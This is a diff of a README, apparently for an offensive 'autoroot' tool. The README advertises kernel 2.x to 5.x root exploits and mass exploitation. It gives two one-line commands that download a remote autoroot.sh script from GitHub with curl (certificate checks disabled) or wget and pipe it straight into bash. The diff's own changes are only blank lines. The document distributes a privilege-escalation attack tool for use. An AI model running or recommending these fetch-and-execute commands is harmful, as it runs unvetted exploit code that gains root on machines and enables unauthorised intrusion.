@@ -14,10 +14,15 @@
 
 <samp>
 * Kernel 2x
+  
 * Kernel 3x
+  
 * Kernel 4x
+  
 * Kernel 5x
+  
 * TOP Exploit root
+  
 * All Mass Exploit
 
 </samp>
@@ -25,11 +30,15 @@
 
 
 <div align="center"><h1>Curl</h1></div>
+
 ```
 root@HaxorSec:~# bash -c "$(curl -fsSL https://raw.githubusercontent.com/HaxorSecInfec/autoroot.sh/main/autoroot.sh -k)"	
 ```
+
 <div align="center"><h1>Wget</h1></div>
+
 ```
+
 root@HaxorSec:~# bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/HaxorSecInfec/autoroot.sh/main/autoroot.sh)"
 ``
 
